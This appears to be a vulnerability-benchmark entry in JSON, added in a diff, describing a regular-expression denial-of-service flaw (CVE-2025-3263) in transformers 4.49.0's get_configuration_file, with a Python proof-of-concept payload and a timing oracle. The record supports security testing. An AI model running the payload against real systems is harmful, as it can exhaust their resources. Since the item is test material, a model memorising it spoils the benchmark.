@@ -1,0 +1,15 @@
+{
+  "file_id": "222_transformers_huntr_c7a69150-54f8-4e81-8094-791e7a2a0f29",
+  "numeric_id": "222",
+  "library_hint": "transformers",
+  "source": "huntr",
+  "title": "Regular expression Denial of Service (ReDoS) in transformers.configuration_utils.get_configuration_file due to catastrophic backtracking in config\\.(.*)\\.json pattern",
+  "cve": "CVE-2025-3263",
+  "cwe": "CWE-1333: Inefficient Regular Expression Complexity",
+  "library": "transformers",
+  "affected_version": "== 4.49.0",
+  "vulnerable_function": "get_configuration_file",
+  "triggerability": "indirect",
+  "trigger_payload": "from transformers.configuration_utils import get_configuration_file\nimport time\nfor i in range(1, 100000, 1000):\n    payload = ['config.z' * i + 'json']\n    start = time.perf_counter()\n    get_configuration_file(payload)\n    end = time.perf_counter()\n    execution_time = end - start\n    print(f'Payload length {i}, execution time: {execution_time:.4f} seconds')",
+  "oracle": "Non-linear increase in execution time as payload length increases, indicating catastrophic backtracking in regex matching"
+}
